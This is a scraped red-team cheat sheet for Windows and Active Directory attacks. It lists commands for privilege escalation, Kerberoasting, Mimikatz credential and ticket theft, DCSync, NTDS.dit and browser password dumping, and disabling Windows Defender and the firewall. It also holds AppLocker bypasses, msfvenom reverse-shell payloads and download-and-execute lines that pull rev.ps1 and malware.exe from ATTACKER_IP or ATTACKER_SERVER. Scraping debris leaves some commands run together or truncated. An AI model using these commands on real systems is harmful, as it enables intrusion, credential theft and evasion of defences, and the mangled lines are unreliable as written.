# red team cheatsheet 

```bash
## know how privilege escalation windows
```

```


systeminfo
hostname 



wmic qfe get Caption,Description,HotFixID,InstalledOn



net users
net localgroups
net user hacker



net group /domain
net group /domain 

ipconfig /all
route print
arp -A



whoami /priv



findstr /spin "password" *.*



tasklist /SVC



netstat -ano



dir /a-r-d /s /b




sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul



[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()



([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()



[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()



([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()



nltest /dclist:offense.local
net group "domain controllers" /domain



nltest /dsgetdc:offense.local



nltest /domain_trusts



nltest /user:"spotless"



set l



klist



klist sessions



klist



klist tgt



Code language: PHP (php)
```


**General**
-----------

```

<code>

https:
powershell.exe -c "Import-Module C:\Users\Public\PowerUp.ps1; Invoke-AllChecks"
powershell.exe -c "Import-Module C:\Users\Public\Get-System.ps1; Get-System"


. .\getsystem.ps1; [Myprocess]::CreateProcessFromParent((Get-Process Isass).Id,"cmd.exe")

https:

https:

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """</code>Code language: PHP (php)
```


**Kerberoast**
--------------

– For kerberos to work, times have to be within 5 minutes between attacker and victim.

```


.\.rubeus.exe kerberoast /creduser:ecorp\user/credpassword:pass1234

setspn.exe -t evil.corp -q *Code language: PHP (php)
```


**Juicy Potato Exploit**
------------------------

[https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) Pick one CLSID from here according to your system [https://github.com/ohpe/juicy-potato/tree/master/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

Required tokens SeAssignPrimaryTokenPrivilege SeImpersonatePrivilege

```

C:\Windows\Temp\JuicyPotato.exe -p cmd.exe -a "/c whoami > C:\Users\Public\morph3.txt" -t * -l 1031 -c {d20a3293-3341-4ae8-9aaf-8e397cb63c34}Code language: JavaScript (javascript)
```


**Stored Credential**
---------------------

```



runas /user:administrator /savecred "cmd.exe /k whoami"Code language: PHP (php)
```


**Impersonating Tokens with meterpreter**
-----------------------------------------

```

use incognito
list_tokens -u
impersonate_token 
NT-AUTHORITY\SystemCode language: PHP (php)
```


PsExec, SmbExec, WMIExec, RDP, PTH in general. Since windows gave support to OpenSSH we should also consider SSH.

**Mimikatz Ticket PTH**
-----------------------

```

Enable-PSRemotingmimikatz.exe '" kerberos:ptt C:\Users\Public\ticketname.kirbi"' "exit"Enter-PSSession -ComputerName ECORPCode language: JavaScript (javascript)
```


**Winrm Session**
-----------------

```

$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\morph3', $pass)Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }Code language: PHP (php)
```


**PTH with Mimikatz**
---------------------

```

Invoke-Mimikatz -Command '"sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:command"'Code language: JavaScript (javascript)
```


**Database Links**
------------------

```


https:
Get-SQLServerLink -Instance server -Verbose
powershell.exe -c "Import-Module C:\Users\Public\PowerUpSQL.ps1; Invoke-SQLEscalatePriv -Verbose -Instance ECORP\sql"

select srvname from master..sysservers;

Get-SQLServerLinkCrawl -Instance server -Query "exec master..xp_cmdshell 'whoami'"

select * from openquery("ECORP\FOO", 'select TABLE_NAME from FOO.INFORMATION_SCHEMA.TABLES') 



select * from openquery("server",'select * from master..sysservers') EXECUTE AS USER = 'internal_user' ('sp_configure "xp_cmdshell",1;reconfigure;') AT "server"Code language: PHP (php)
```


**Golden and Silver Tickets**
-----------------------------

Keys depend of ticket : –> for a Golden, they are from the krbtgt account; –> for a Silver, it comes from the “computer account” or “service account”

```



lsadump::dcsync /domain:evil.corp /user:krbtgt
lsadump::lsa /inject
lsadump:::lsa /patch
lsadump::trust /patch






kerberos::golden /user:morph3 /domain:evil.corp /sid:domains-sid /krbtgt:krbtgt-hash /ticket:ticket.kirbi /groups:501,502,513,512,520,518,519 


kerberos::purge 
kerberos::ptt golden.tck 

powershell.exe -c "klist"

dir \\DC\C$
psexec.exe \\DC cmd.exe




kerberos::golden /user:morph3 /domain:domain /sid:domain-sid /target:evilcorp-sql102.evilcorp.local.1433 /service:MSSQLSvc /rc4:service-hash /ptt /id:1103
sqlcmd -S evilcorp-sql102.evilcorp.local
select SYSTEM_USER;
GO
kerberos::golden /user:JohnDoe /id:500 /domain:targetdomain.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:targetserver.targetdomain.com /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /pttCode language: PHP (php)
```


**DC Shadow**
-------------

DC Shadow attack aims to inject malicious Domain Controllers into AD infrastructure so that we can dump actual AD members.

```


wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid

lsadump::dcshadow /object:"CN=morph3,OU=Business,OU=Users,OU=ECORP,DC=ECORP,DC=local" /attribute:sidhistory /value:sid

lsadump::dcshadow /push


lsadump::dcsync /domain:ECORP.local /account:krbtgt

https:Code language: PHP (php)
```


**DC Sync**
-----------

```


lsadump::dcsync /domain:domain /all /csv
lsadump::dcsync /user:krbtgt

https:
powershell.exe -c "Import-Module .\Invoke-DCSync.ps1; Invoke-DCSync -PWDumpFormat"

python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
python secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCALCode language: PHP (php)
```


**Powershell Constrained Language Bypass**
------------------------------------------

```

powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')PSByPassCLM
```


**Windows Defender**
--------------------

```

sc config WinDefend start= disabled
sc stop WinDefend

Set-MpPreference -DisableRealtimeMonitoring $true

"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -AllCode language: PHP (php)
```


**Firewall**
------------

```

Netsh Advfirewall show allprofilesNetSh Advfirewall set allprofiles state offCode language: JavaScript (javascript)
```


**Ip Whitelisting**
-------------------

```

New-NetFirewallRule -Name inrules -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IPCode language: PHP (php)
```


**Applocker ByPass**
--------------------

```

https:
https:
https:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.56 LPORT=9001  -f csharp -e x86/shikata_ga_nai -i  > out.cs 

https:
Invoke-WebRequest "http://ATTACKER_IP/payload.csproj" -OutFile "out.csproj"; C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\out.csprojCode language: PHP (php)
```


**GreatSCT**
------------

```

 
python GreatSCT.py --ip 192.168.1.56 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload1.exe
python3 GreatSCT.py -t Bypass -p regasm/meterpreter/rev_tcp --ip 192.168.1.56 --port 9001
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dllCode language: PHP (php)
```


**EvilSalsa**
-------------

```


python EncrypterAssembly/encrypterassembly.py EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt
EncrypterAssembly.exe EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt

SalseoLoader.exe password http:

python icmpsh_m.py "ATTACKER_IP" "VICTIM_IP"
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp ATTACKER_IPCode language: PHP (php)
```


**Changing Permissions of a file**
----------------------------------

```

icacls text.txt /grant Everyone:F
```


**Downloading files**
---------------------

```

IEX (New-Object System.Net.WebClient).DownloadString("http://ATTACKER_IP/rev.ps1")(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_SERVER/malware.exe", "C:\Windows\Temp\malware.exe")  Invoke-WebRequest "http://ATTACKER_SERVER/malware.exe" -OutFile "C:\Windows\Temp\malware.exe"Code language: JavaScript (javascript)
```


**Adding user to Domain admins**
--------------------------------

```

Add-DomainGroupMember -Identity 'Domain Admins' -Members morph3 -VerboseCode language: JavaScript (javascript)
```


**Base64 Decode**
-----------------

```

certutil -decode foo.b64 foo.exeCode language: CSS (css)
```


**Network sharing**
-------------------

```


net share
wmic share get /format:list

net view
net view \\dc.ecorp.foo /all
wmic /node: dc.ecorp.foo share get

net use Z: \\127.0.0.1\C$ /user:user password123Code language: PHP (php)
```


**Port Forwarding**
-------------------

```

 #Port forward using plink 
 plink.exe -l user -pw pass123 192.168.1.56 -R 8080:127.0.0.1:8080
 #Port forward using meterpreterportfwd
 add -l attacker-port -p victim-port -r victim-ip
 portfwd add -l 3306 -p 3306 -r 192.168.1.56
 # Dynamic Pivoting using ssh with proxy chain 
 ssh -D 9050 root@target 
 # Port forwarding with SSH 
 ssh -L localhost:8080:target:8080 root@targetipCode language: CSS (css)
```


**Powershell Portscan**
-----------------------

```

0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(VICTIM_IP,$_)) "Port $_ is open!"} 2>$nullCode language: PHP (php)
```


**Recovering Powershell Secure String**
---------------------------------------

```

 
$user = "user"
$file = "user-pass.xml"
$cred= New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, (Get-Content $file | ConvertTo-SecureString)
Invoke-Command -ComputerName ECORP -Credential $cred -Authentication credssp -ScriptBlock { whoami }

[System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR("string"))

$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)
$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
$resultCode language: PHP (php)
```


**Injecting PowerShell scripts Into sessions**
----------------------------------------------

```

Invoke-Command -FilePath scriptname -Sessions $sessions
Enter-PSSession -Session $sessCode language: PHP (php)
```


**Enable RDP**
--------------

```


reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

net localgroup "Remote Desktop Users" morph3 /add

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allowCode language: PHP (php)
```


**Decrypting EFS files with Mimikatz**
--------------------------------------

Follow the link here [How to Decrypt EFS Files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

```

privilege::debug 
token::elevate 
crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\thecert" /export
dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\SID\id"

dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\SID\masterkey" /password:pass123

dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\SID\id" /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b
openssl x509 -inform DER -outform PEM -in blah.der -out public.pem
openssl rsa -inform PVK -outform PEM -in blah.pvk -out private.pem
openssl pkcs12 -in public.pem -inkey private.pem -password pass:randompass -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

certutil -user -p randompass -importpfx cert.pfx NoChain,NoRoot
type "C:\Users\Administrator\Documents\encrypted.txt"Code language: PHP (php)
```


**Reading Event Logs**
----------------------

User must be in “Event Log Reader” group [Follow this link](https://evotec.xyz/powershell-everything-you-wanted-to-know-about-event-logs/)

```

Get-WinEvent -ListLog *

$cred = Get-Credentials
Get -WinEvent -ListLog * -ComputerName AD1 -Credentials $cred

(Get-WinEvent -FilterHashtable @{LogName = 'Security'} | Select-Object @{name='NewProcessNam
e';expression={ $_.Properties[5].Value }}, @{name='CommandLine';expression={
$_.Properties[8].Value }}).commandlineCode language: PHP (php)
```


**Password Dump**
-----------------

```


post/windows/gather/enum_chrome
post/multi/gather/firefox_creds
post/firefox/gather/cookies
post/firefox/gather/passwords
post/windows/gather/forensics/browser_history
post/windows/gather/enum_putty_saved_sessions

collection/ChromeDump
collection/FoxDump
collection/netripper
credentials/sessiongopher

privilege::debug
sekurlsa::logonpasswordsCode language: PHP (php)
```


**NTDS.dit dump**
-----------------

```

secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit -outputfile /tmp/result local
python crackmapexec.py 192.168.1.56 -u morph3 -p pass1234 -d evilcorp.com --ntds drsuapi

lsadump::lsa /injectCode language: PHP (php)
```


**Ad Environment**
------------------

[icebreaker](https://github.com/DanMcInerney/icebreaker) [bloodhound](https://github.com/BloodHoundAD/BloodHound) [adfly](https://github.com/lawrenceamer/adfly)

**Post Exploitation**
---------------------

[Empire](https://github.com/EmpireProject/Empire) [DeathStar](https://github.com/byt3bl33d3r/DeathStar) [CrackMapExec – CME](https://github.com/byt3bl33d3r/CrackMapExec) [Covenant](https://github.com/cobbr/Covenant) [Rubeus](https://github.com/GhostPack/Rubeus) [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

**Bypass**
----------

[Ebowla](https://github.com/Genetic-Malware/Ebowla) [Veil-Framework](https://github.com/Veil-Framework/Veil) [PsBypassCLM](https://github.com/padovah4ck/PSByPassCLM) i[nvoke-metasploit](https://github.com/jaredhaight/Invoke-MetasploitPayload)

**Swiss Knife**
---------------

[impacket](https://github.com/SecureAuthCorp/impacket)

[0xsp mongoose](https://github.com/lawrenceamer/0xsp-Mongoose)
